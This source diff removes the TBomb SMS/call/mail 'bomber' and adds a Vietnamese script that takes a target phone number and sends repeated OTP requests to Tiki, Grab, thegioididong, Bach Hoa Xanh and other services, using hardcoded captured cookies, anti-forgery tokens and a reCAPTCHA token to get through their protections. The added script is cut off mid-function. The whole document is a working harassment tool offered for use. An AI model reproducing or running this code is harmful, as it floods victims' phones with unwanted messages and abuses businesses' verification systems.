@@ -1,452 +1,79 @@
-#!/usr/bin/python
-# -*- coding: UTF-8 -*-
-
-import os
-import shutil
-import sys
-import subprocess
-import string
-import random
-import json
-import re
-import time
-import argparse
-import zipfile
-from io import BytesIO
-
-from concurrent.futures import ThreadPoolExecutor, as_completed
-
-from utils.decorators import MessageDecorator
-from utils.provider import APIProvider
-
-try:
-    import requests
-    from colorama import Fore, Style
-except ImportError:
-    print("\tSome dependencies could not be imported (possibly not installed)")
-    print(
-        "Type `pip3 install -r requirements.txt` to "
-        " install all required packages")
-    sys.exit(1)
-
-
-def readisdc():
-    with open("isdcodes.json") as file:
-        isdcodes = json.load(file)
-    return isdcodes
-
-
-def get_version():
+import requests,os,sys
+from time import sleep
+os.system("cls" if os.name == "nt" else "clear")
+list_phone=[]
+phone=input('ENTER PHONE: ')
+list_phone.append(phone)
+def tiki(i,phone):
     try:
-        return open(".version", "r").read().strip()
-    except Exception:
-        return '1.0'
-
-
-def clr():
-    if os.name == "nt":
-        os.system("cls")
-    else:
-        os.system("clear")
-
-
-def bann_text():
-    clr()
-    logo = """
-   ████████ █████                 ██
-   ▒▒▒██▒▒▒ ██▒▒██                ██
-      ██    ██  ██        ██   ██ ██
-      ██    █████▒  ████  ███ ███ █████
-      ██    ██▒▒██ ██  ██ ██▒█▒██ ██▒▒██
-      ██    ██  ██ ██  ██ ██ ▒ ██ ██  ██
-      ██    █████▒ ▒████▒ ██   ██ █████▒
-      ▒▒    ▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒
-                                         """
-    if ASCII_MODE:
-        logo = ""
-    version = "Version: "+__VERSION__
-    contributors = "Contributors: "+" ".join(__CONTRIBUTORS__)
-    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
-    mesgdcrt.SuccessMessage(version)
-    mesgdcrt.SectionMessage(contributors)
-    print()
-
-
-def check_intr():
+        data={"phone_number":phone}
+        ti=requests.post('https://tiki.vn/api/v2/customers/otp_codes',headers={'accept': 'application/json, text/plain, */*','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-length': str(len(data)),'content-type': 'application/json;charset=UTF-8','origin': 'https://tiki.vn','referer': 'https://tiki.vn/','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',},json={"phone_number":phone}).json()
+        if 'true' in str(ti):print('TIKI =>',i,ti)
+    except:pass
+def momo(i,phone):
     try:
-        requests.get("https://motherfuckingwebsite.com")
-    except Exception:
-        bann_text()
-        mesgdcrt.FailureMessage("Poor internet connection detected")
-        sys.exit(2)
-
-
-def format_phone(num):
-    num = [n for n in num if n in string.digits]
-    return ''.join(num).strip()
-
-
-def do_zip_update():
-    success = False
-    if DEBUG_MODE:
-        zip_url = "https://github.com/TheSpeedX/TBomb/archive/dev.zip"
-        dir_name = "TBomb-dev"
-    else:
-        zip_url = "https://github.com/TheSpeedX/TBomb/archive/master.zip"
-        dir_name = "TBomb-master"
-    print(ALL_COLORS[0]+"Downloading ZIP ... "+RESET_ALL)
-    response = requests.get(zip_url)
-    if response.status_code == 200:
-        zip_content = response.content
-        try:
-            with zipfile.ZipFile(BytesIO(zip_content)) as zip_file:
-                for member in zip_file.namelist():
-                    filename = os.path.split(member)
-                    if not filename[1]:
-                        continue
-                    new_filename = os.path.join(
-                        filename[0].replace(dir_name, "."),
-                        filename[1])
-                    source = zip_file.open(member)
-                    target = open(new_filename, "wb")
-                    with source, target:
-                        shutil.copyfileobj(source, target)
-            success = True
-        except Exception:
-            mesgdcrt.FailureMessage("Error occured while extracting !!")
-    if success:
-        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
-        mesgdcrt.GeneralMessage(
-            "Please run the script again to load the latest version")
-    else:
-        mesgdcrt.FailureMessage("Unable to update TBomb.")
-        mesgdcrt.WarningMessage(
-            "Grab The Latest one From https://github.com/TheSpeedX/TBomb.git")
-
-    sys.exit()
-
-
-def do_git_update():
-    success = False
+        mm=requests.get('https://stoolnopro.com/api/momo/index.php?phone='+phone).text
+        print('MOMO =>',i,mm)
+    except:pass
+def vtpay(i,phone):
     try:
-        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL, end='')
-        process = subprocess.Popen("git checkout . && git pull ",
-                                   shell=True,
-                                   stdout=subprocess.PIPE,
-                                   stderr=subprocess.STDOUT)
-        while process:
-            print(ALL_COLORS[0]+'.'+RESET_ALL, end='')
-            time.sleep(1)
-            returncode = process.poll()
-            if returncode is not None:
-                break
-        success = not process.returncode
-    except Exception:
-        success = False
-    print("\n")
-
-    if success:
-        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
-        mesgdcrt.GeneralMessage(
-            "Please run the script again to load the latest version")
-    else:
-        mesgdcrt.FailureMessage("Unable to update TBomb.")
-        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
-        mesgdcrt.GeneralMessage("Then run command:")
-        print(
-            "git checkout . && "
-            "git pull https://github.com/TheSpeedX/TBomb.git HEAD")
-    sys.exit()
-
-
-def update():
-    if shutil.which('git'):
-        do_git_update()
-    else:
-        do_zip_update()
-
-
-def check_for_updates():
-    if DEBUG_MODE:
-        mesgdcrt.WarningMessage(
-            "DEBUG MODE Enabled! Auto-Update check is disabled.")
-        return
-    mesgdcrt.SectionMessage("Checking for updates")
-    fver = requests.get(
-        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version"
-    ).text.strip()
-    if fver != __VERSION__:
-        mesgdcrt.WarningMessage("An update is available")
-        mesgdcrt.GeneralMessage("Starting update...")
-        update()
-    else:
-        mesgdcrt.SuccessMessage("TBomb is up-to-date")
-        mesgdcrt.GeneralMessage("Starting TBomb")
-
-
-def notifyen():
+        vt=requests.get('https://danganhduy.io/login-vtpay.php?phone='+phone).text
+        print('VTPAY =>',i,phone)
+    except:pass
+def tgdd(i,phone):
     try:
-        if DEBUG_MODE:
-            url = "https://github.com/TheSpeedX/TBomb/raw/dev/.notify"
-        else:
-            url = "https://github.com/TheSpeedX/TBomb/raw/master/.notify"
-        noti = requests.get(url).text.upper()
-        if len(noti) > 10:
-            mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
-            print()
-    except Exception:
-        pass
-
-
-def get_phone_info():
-    while True:
-        target = ""
-        cc = input(mesgdcrt.CommandMessage(
-            "Enter your country code (Without +): "))
-        cc = format_phone(cc)
-        if not country_codes.get(cc, False):
-            mesgdcrt.WarningMessage(
-                "The country code ({cc}) that you have entered"
-                " is invalid or unsupported".format(cc=cc))
-            continue
-        target = input(mesgdcrt.CommandMessage(
-            "Enter the target number: +" + cc + " "))
-        target = format_phone(target)
-        if ((len(target) <= 6) or (len(target) >= 12)):
-            mesgdcrt.WarningMessage(
-                "The phone number ({target})".format(target=target) +
-                "that you have entered is invalid")
-            continue
-        return (cc, target)
-
-
-def get_mail_info():
-    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
-    while True:
-        target = input(mesgdcrt.CommandMessage("Enter target mail: "))
-        if not re.search(mail_regex, target, re.IGNORECASE):
-            mesgdcrt.WarningMessage(
-                "The mail ({target})".format(target=target) +
-                " that you have entered is invalid")
-            continue
-        return target
-
-
-def pretty_print(cc, target, success, failed):
-    requested = success+failed
-    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
-    mesgdcrt.GeneralMessage(
-        "Please stay connected to the internet during bombing")
-    mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
-    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
-    mesgdcrt.GeneralMessage("Successful   : " + str(success))
-    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
-    mesgdcrt.WarningMessage(
-        "This tool was made for fun and research purposes only")
-    mesgdcrt.SuccessMessage("TBomb was created by SpeedX")
-
-
-def workernode(mode, cc, target, count, delay, max_threads):
-
-    api = APIProvider(cc, target, mode, delay=delay)
-    clr()
-    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
-    mesgdcrt.GeneralMessage(
-        "Please stay connected to the internet during bombing")
-    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
-    mesgdcrt.GeneralMessage("Target        : " + cc + target)
-    mesgdcrt.GeneralMessage("Amount        : " + str(count))
-    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
-    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
-                            " seconds")
-    mesgdcrt.WarningMessage(
-        "This tool was made for fun and research purposes only")
-    print()
-    input(mesgdcrt.CommandMessage(
-        "Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))
-
-    if len(APIProvider.api_providers) == 0:
-        mesgdcrt.FailureMessage("Your country/target is not supported yet")
-        mesgdcrt.GeneralMessage("Feel free to reach out to us")
-        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
-        bann_text()
-        sys.exit()
-
-    success, failed = 0, 0
-    while success < count:
-        with ThreadPoolExecutor(max_workers=max_threads) as executor:
-            jobs = []
-            for i in range(count-success):
-                jobs.append(executor.submit(api.hit))
-
-            for job in as_completed(jobs):
-                result = job.result()
-                if result is None:
-                    mesgdcrt.FailureMessage(
-                        "Bombing limit for your target has been reached")
-                    mesgdcrt.GeneralMessage("Try Again Later !!")
-                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
-                    bann_text()
-                    sys.exit()
-                if result:
-                    success += 1
-                else:
-                    failed += 1
-                clr()
-                pretty_print(cc, target, success, failed)
-    print("\n")
-    mesgdcrt.SuccessMessage("Bombing completed!")
-    time.sleep(1.5)
-    bann_text()
-    sys.exit()
-
-
-def selectnode(mode="sms"):
-    mode = mode.lower().strip()
+        data={'phoneNumber': phone,'isReSend': 'false','__RequestVerificationToken': 'CfDJ8ATZIKhAOnlOk2rhIVIlhM5MWfIylT9T34mJGrIgGvd2rGdog7FJcSk7ssv__CjCG2vi4RI1unT42uqjUm6JmFLSfzHoVK9Pj07Q9-WsbmiQS8RN-CZvXobBZfP3N78_BERGbOXVE9KGMN08Qr_QdkY'}
+        dd=requests.post('https://www.thegioididong.com/lich-su-mua-hang/Login/GetVerifyCode',headers={'Accept': '*/*','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(data)),'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'TBMCookie_3209819802479625248=257483001654510391tEZu9Mo57mnHfd9/KdO68W6bCT4=; ___utmvm=###########; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%7D; _gid=GA1.2.2142725704.1654510350; _fbp=fb.1.1654510350234.532530980; cebs=1; _ce.s=v~0805f607e7acf3a4ffd0d32e1f231d2c229f3d96~vpv~0; lhc_per=vid|41495ef88a41413ea1b3; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ATZIKhAOnlOk2rhIVIlhM7olqv2_vSi34Aeo2H1ARYuNem1p1789vha6aaj2gh8z1RJzOZgrNuFmWE2VTleytvFo0twGIM4xG7lonb-NBDw7wBkTPndcpbAExt8wLFH3tkZZH3kyu6dAGMF-u_goT8; _gat=1; _gat_UA-918185-25=1; _ga_TLRZMSX5ME=GS1.1.1654510349.1.1.1654510425.56; _ga=GA1.1.1833878188.1654510350; SvID=beline2683|Yp3Tk|Yp3TP; cebsp=2','Host': 'www.thegioididong.com','Origin': 'https://www.thegioididong.com','Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Requested-With': 'XMLHttpRequest'},data=data).json()
+        print('TGDĐ1 =>',i,dd['error'])
+    except:pass
+    #####
     try:
-        clr()
-        bann_text()
-        check_intr()
-        check_for_updates()
-        notifyen()
-
-        max_limit = {"sms": 500, "call": 15, "mail": 200}
-        cc, target = "", ""
-        if mode in ["sms", "call"]:
-            cc, target = get_phone_info()
-            if cc != "91":
-                max_limit.update({"sms": 100})
-        elif mode == "mail":
-            target = get_mail_info()
-        else:
-            raise KeyboardInterrupt
-
-        limit = max_limit[mode]
-        while True:
-            try:
-                message = ("Enter number of {type}".format(type=mode.upper()) +
-                           " to send (Max {limit}): ".format(limit=limit))
-                count = int(input(mesgdcrt.CommandMessage(message)).strip())
-                if count > limit or count == 0:
-                    mesgdcrt.WarningMessage("You have requested " + str(count)
-                                            + " {type}".format(
-                                                type=mode.upper()))
-                    mesgdcrt.GeneralMessage(
-                        "Automatically capping the value"
-                        " to {limit}".format(limit=limit))
-                    count = limit
-                delay = float(input(
-                    mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
-                    .strip())
-                # delay = 0
-                max_thread_limit = (count//10) if (count//10) > 0 else 1
-                max_threads = int(input(
-                    mesgdcrt.CommandMessage(
-                        "Enter Number of Thread (Recommended: {max_limit}): "
-                        .format(max_limit=max_thread_limit)))
-                    .strip())
-                max_threads = max_threads if (
-                    max_threads > 0) else max_thread_limit
-                if (count < 0 or delay < 0):
-                    raise Exception
-                break
-            except KeyboardInterrupt as ki:
-                raise ki
-            except Exception:
-                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
-                print()
-
-        workernode(mode, cc, target, count, delay, max_threads)
-    except KeyboardInterrupt:
-        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
-        sys.exit()
-
-
-mesgdcrt = MessageDecorator("icon")
-if sys.version_info[0] != 3:
-    mesgdcrt.FailureMessage("TBomb will work only in Python v3")
-    sys.exit()
-
-try:
-    country_codes = readisdc()["isdcodes"]
-except FileNotFoundError:
-    update()
-
-
-__VERSION__ = get_version()
-__CONTRIBUTORS__ = ['SpeedX', 't0xic0der', 'scpketer', 'Stefan']
-
-ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
-              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
-RESET_ALL = Style.RESET_ALL
-
-ASCII_MODE = False
-DEBUG_MODE = False
-
-description = """TBomb - Your Friendly Spammer Application
-
-TBomb can be used for many purposes which incudes -
-\t Exposing the vulnerable APIs over Internet
-\t Friendly Spamming
-\t Testing Your Spam Detector and more ....
-
-TBomb is not intented for malicious uses.
-"""
-
-parser = argparse.ArgumentParser(description=description,
-                                 epilog='Coded by SpeedX !!!')
-parser.add_argument("-sms", "--sms", action="store_true",
-                    help="start TBomb with SMS Bomb mode")
-parser.add_argument("-call", "--call", action="store_true",
-                    help="start TBomb with CALL Bomb mode")
-parser.add_argument("-mail", "--mail", action="store_true",
-                    help="start TBomb with MAIL Bomb mode")
-parser.add_argument("-ascii", "--ascii", action="store_true",
-                    help="show only characters of standard ASCII set")
-parser.add_argument("-u", "--update", action="store_true",
-                    help="update TBomb")
-parser.add_argument("-c", "--contributors", action="store_true",
-                    help="show current TBomb contributors")
-parser.add_argument("-v", "--version", action="store_true",
-                    help="show current TBomb version")
-
-
-if __name__ == "__main__":
-    args = parser.parse_args()
-    if args.ascii:
-        ASCII_MODE = True
-        mesgdcrt = MessageDecorator("stat")
-    if args.version:
-        print("Version: ", __VERSION__)
-    elif args.contributors:
-        print("Contributors: ", " ".join(__CONTRIBUTORS__))
-    elif args.update:
-        update()
-    elif args.mail:
-        selectnode(mode="mail")
-    elif args.call:
-        selectnode(mode="call")
-    elif args.sms:
-        selectnode(mode="sms")
-    else:
-        choice = ""
-        avail_choice = {
-            "1": "SMS",
-            "2": "CALL",
-            "3": "MAIL"
-        }
-        try:
-            while (choice not in avail_choice):
-                clr()
-                bann_text()
-                print("Available Options:\n")
-                for key, value in avail_choice.items():
-                    print("[ {key} ] {value} BOMB".format(key=key,
-                                                          value=value))
-                print()
-                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
-            selectnode(mode=avail_choice[choice].lower())
-        except KeyboardInterrupt:
-            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
-            sys.exit()
-    sys.exit()
+        data2={'phoneNumer': phone,'isResendOTP': 'true','__RequestVerificationToken': 'MF7S_vQoTHiuscmn_2xaYViLGTwt1MfRNB30f7FNer0Oc8bjmyvWb27oaoLCAhnt4GIZfK9rw5eNvQtrfsXPFr7R6CM1'}
+        dd2=requests.post('https://www.thegioididong.com/game-app/aj/Profile/SendVerifyCodeLoginByPhoneNumber',headers={'Accept': '*/*','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(data2)),'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'TBMCookie_3209819802479625248=257483001654510391tEZu9Mo57mnHfd9/KdO68W6bCT4=; ___utmvm=###########; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%7D; _gid=GA1.2.2142725704.1654510350; _fbp=fb.1.1654510350234.532530980; cebs=1; _ce.s=v~0805f607e7acf3a4ffd0d32e1f231d2c229f3d96~vpv~0; lhc_per=vid|41495ef88a41413ea1b3; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ATZIKhAOnlOk2rhIVIlhM7olqv2_vSi34Aeo2H1ARYuNem1p1789vha6aaj2gh8z1RJzOZgrNuFmWE2VTleytvFo0twGIM4xG7lonb-NBDw7wBkTPndcpbAExt8wLFH3tkZZH3kyu6dAGMF-u_goT8; MWG_ORDERHISTORY_SS=CfDJ8ATZIKhAOnlOk2rhIVIlhM5kANqQ8BxDTom8NqgYn1kTBESsk%2FhsikEU%2BzraqALtOar9GJ29W4U6vLiZJLEKPkpjCj%2FkgG3T5qIgYw2knXG31pVjdLtXST4XVbOPElLWkou5GnMMypdX1hrXA8%2FRzDMNu50e6OMY6Q2ypAGHU6js; __RequestVerificationToken_L2dhbWUtYXBw0=ly_XE4br_ZUwilZ5gyiDlOjMCrJ83Z6aPiO2lQZMCt5dcxdgVNYpr1VxE3yds9GgcWr2JG8cgsfO-ysyP305MAW6tJw1; chat.info=; chat.username=20220501Sn198X3cYRmv9ntvADoo; chat.chating=; chat.notifychatmsg=; _ga=GA1.1.1833878188.1654510350; cebsp=5; _ga_TLRZMSX5ME=GS1.1.1654510349.1.1.1654511614.51; ASP.NET_SessionId=b1krpfzg23100zmovwazgbw0; SvID=tt615|Yp3YO|Yp3TP','Host': 'www.thegioididong.com','Origin': 'https://www.thegioididong.com','Referer': 'https://www.thegioididong.com/game-app','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Requested-With': 'XMLHttpRequest'},data=data2).json()
+        print('TGDĐ2 =>',i,dd2['error'])
+    except:pass
+def grab(i,phone):
+    try:
+        json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","ctx_id":"c6522e925f2f4103bc7e1e57f1f5c769","country_code":"VN","method":"SMS","num_digits":6,"scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number":f"84{phone}"}
+        h={'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(json)),'Content-Type': 'application/json','Cookie': 'utm_source=Google; utm_medium=non-paid; _gid=GA1.2.245624710.1654581920; _gcl_au=1.1.612621744.1654581921; __antscv_utm=%7B%22channel%22%3A%22google.com%22%2C%22utm_source%22%3A%22google.com%22%2C%22type%22%3A2%7D; ants_ad_ss=f4c4f00d5971ec601cb133d5570da34d5496ae62; _atrk_siteuid=XU0lTkSBimtaGeIG; _atrk_ssid=nCls6llASkMHYyA-cQJoJ2; appier_page_isView_0c798181a14efc5=829e7893cc80ca42a28c40645427fb6a9fd8ddf0b8ec6d76d12087db193b7377; appier_pv_counter701ec4bbafbcfc5=0; appier_page_isView_701ec4bbafbcfc5=829e7893cc80ca42a28c40645427fb6a9fd8ddf0b8ec6d76d12087db193b7377; _fbp=fb.1.1654581922210.230747937; _hjFirstSeen=1; _hjSession_1532049=eyJpZCI6IjI2MjU5MzhmLTVlNWYtNDYyMy1iMWRiLTcyNjUwMGE1ZTViNiIsImNyZWF0ZWQiOjE2NTQ1ODE5MjI0MTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; appier_utmz=%7B%22csr%22%3A%22google%22%2C%22timestamp%22%3A1654581922%2C%22lcsr%22%3A%22google%22%7D; _atrk_sessidx=2; appier_pv_counter0c798181a14efc5=1; _hjSessionUser_1532049=eyJpZCI6IjYxMDQxY2I5LTRhYjMtNTRmZi1hMTE0LWVhNTk0NTU5ZDkzYyIsImNyZWF0ZWQiOjE2NTQ1ODE5MjE5NzUsImV4aXN0aW5nIjp0cnVlfQ==; _ga_65FYNH52KQ=GS1.1.1654581921.1.1.1654581951.30; _gat_UA-73060858-24=1; _ga=GA1.2.1660163821.1654581920; _ga_RPEHNJMMEM=GS1.1.1654581955.1.0.1654581958.57; _gat_UA-73060858-15=1','Host': 'partner-api.grab.com','Origin': 'https://weblogin.grab.com','Referer': 'https://weblogin.grab.com/','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Recaptcha': '03AGdBq24kZXDmnGnB0hJvwTHHPu6EnthzsoYYzazwOl6Tv0ySsYsAhhJExs3OPSR9mJ7yvBM3BlE8W2m8zse9A4OsCa8y7dspi-RL6inW3mXrLsWpHWavrstIN81B_CV80LT1zxoXBiEk3tgMfxbm1P7dTTqJDZ-2E9OnOj1Ce3cGhX7Op2U2HHJda3jzoVY7oZNsv53_VWWX-KA7uobs6EK82Pqt8NJFJsDLX1kxlEvqDJIn0dP3uYwyAPvgZNulQdiojF69eKhF3FB4EyT3p7oPg29nzZL3y3wwGCiJRfalJ1ILrcdhExln1l-JyTiBDJvpDoYLv9XHV9akleB025vJV5l4MlNgF78KP-Ry9yikp_a-7D06Y28xDwGv8FWGRwZPug_mRedvsH4fy6ezg-OJzuCxmvqTvryw5r4ZL6iWnzm0wBLJiH1nZND27I2ob_RUFPBGVejS-hjlNzF8jSanmpJuQIhteMdcVkpkA7L_UzwozCP95TMRI2bt8aUQFKP2nkatIz4_5D76NnTh_UAltP1TilAcEAWXwcCZgL6S7o09TcTDHa0S1tBH_CN8W_z_fqRvONPGycY4CgesdZAhezR-IwJyawcrReaynTB9V3fjd4wVolNlbvf1kLuE3vFNSJzC3grtp_ja3GHk294ywQ-MMZdzy-eWfQdKP1M_TJi1cS7TLnE3m8699pbdcIqlm2pQApSwjRRyKRwvwYC3tQZ5Jxd5BIdQ8IRx-5gQQ6nkNySprxShtHAOE5yDHyr2vnwflZc9kaZFz_125NC-OD_FBXAe9d2g-VG_ilBk-BrM0wcSLs_w0F1HrLAwX-GKUgrIvDpmNg71Uh1eb8Ek8Dn8iDA1TrQNF9ol6kKisdXN4Z9FKcHduFRvqS9SkkVUJD1WdxFfPYqqlpzZ9p1a02s1WJlZoWIYb3ZEhQ0XmeF9Imjs370D6b4rnOiZAzUSia07SVTu3m1HrCoXQAgIgXiJ_h8UZXvE-ppIrzvacnP3eG7gOuqvPjE9ep77UF9Qq_NhWXKuR-mM-as0eFKoQGRwBLWUo-8oIdu5T11NBXJ6DgtwREykheIFRjbL0XjxajpFvzkw1dLBzl7-fRetiaZiXcGZ0CDt9dE6lV7WicDX3v42F4QH7dBFkl1Mbxl99e8z5LCaQOP5SLK2uYVyzpjmcIojBku8LMsQhgsEhnZOZt8aA8OUNVE1_14zT6nqMBQuAY8ysJCerMsCEHvSffbsgfT04U-hPKrcVhcZRdM7Wk4IKJDhjhDno2zgBRrpS4HtaiL1IyuwomS4tNnFlH-bCDRJRwKwDULEhDmBQYGRkPiaQik','X-Request-ID': 'a8872813-7996-49a1-abda-18fca3565f86'}
+        grb=requests.post('https://partner-api.grab.com/grabid/v1/oauth2/otp',headers=h,json=json).json()
+        print('GRAB FOOD =>',i,grb)
+    except:pass
+def bach_hoa_xanh(i,phone):
+    try:
+        data={'phone': phone,'objectId': 'a2a9cf21-fd74-424d-b42a-cd696cb405f0','type': '4'}
+        bhx=requests.post('https://www.bachhoaxanh.com/aj/Customer/SendOTP',headers={'Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Length': str(len(data)),'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'TBMCookie_3209819802479625248=462288001654582548aP9erQjHArsbnke1sG9C2+JcyzU=; ___utmvm=###########; ASP.NET_SessionId=vjn3f3mw20nsyqab3rckzcqm; trackSSID=db9a955450517d1b2f81c3b4398e119a; lhc_per=vid|338559d00f0354180a7b; bhx_vcrif={%22Email%22:null%2C%22NameWithGender%22:%22b%E1%BA%A1n%22%2C%22Name%22:null%2C%22Gender%22:-1%2C%22Phone%22:%22%22%2C%22me%22:%22LLw/ckoZPTE=%22}; bhxcid=204d0054-965d-4154-b540-6568d9a26cf2; _gcl_au=1.1.748512260.1654582556; _ga=GA1.2.340455592.1654582556; _gid=GA1.2.1748971856.1654582556; _gat_UA-68702031-1=1; _fbp=fb.1.1654582556207.266857399; cebs=1; __RequestVerificationToken=ZrT89_sr00kS1a7ovjb64yyAj1QffDIkEyFd_qYocqse_d253MiRHTvobJjs2YEJtTId-nzXR7bmYOjuarjg1_EBioEs-9F5BP-OHOehCX81; cebsp=1; _ce.s=v~0b642878d5895a0023bca213afe383978e5fd8d1~vpv~0~v11.rlc~1654582564876; SvID=bhx26175|Yp7tL|Yp7tF','Host': 'www.bachhoaxanh.com','Origin': 'https://www.bachhoaxanh.com','Referer': 'https://www.bachhoaxanh.com/dang-nhap?callback=%2Flich-su-mua-hang','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','X-Requested-With': 'XMLHttpRequest'},data=data).json()
+        print('BACH HOA XANH =>',i,bhx)
+    except:pass
+def dien_may_xanh(i,phone):
+    try:
+        data={'phoneNumber': phone,'isReSend': 'true','__RequestVerificationToken': 'CfDJ8ATZIKhAOnlOk2rhIVIlhM48w_yz-6bF9hXgZtq25uEw7lSI1UaQXREz_Ya9DeeQdj3eBkrag7uGMEeVIgagGIzo-NsvHcbeSQJRqIQIkZqfGrOa6tIBTbViE4086SMRV8n0f05OQQME2xiSRxlved0'}
